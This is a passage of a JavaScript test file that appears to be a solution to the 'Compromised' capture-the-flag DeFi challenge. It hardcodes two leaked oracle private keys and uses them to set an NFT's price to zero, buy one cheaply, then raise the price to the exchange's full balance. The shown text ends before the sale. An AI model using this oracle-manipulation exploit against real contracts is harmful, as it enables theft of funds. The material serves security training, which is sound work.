...
describe("Compromised challenge", function () {
  ...
  it("Execution", async function () {
    ...
    // console.log(await nftToken.balanceOf(player.address), "check YO");
    const pkey1 =
      "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
    const pkey2 =
      "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";

    const oracleAccount1 = new ethers.Wallet(pkey1).connect(ethers.provider);
    const oracleAccount2 = new ethers.Wallet(pkey2).connect(ethers.provider);

    await oracle.connect(oracleAccount1).postPrice("DVNFT", 0n);
    await oracle.connect(oracleAccount2).postPrice("DVNFT", 0n);

    const nftid = await exchange
      .connect(player)
      .buyOne({ value: ethers.utils.parseUnits("0.01", 18) });

    await oracle
      .connect(oracleAccount1)
      .postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
    await oracle
      .connect(oracleAccount2)
      .postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
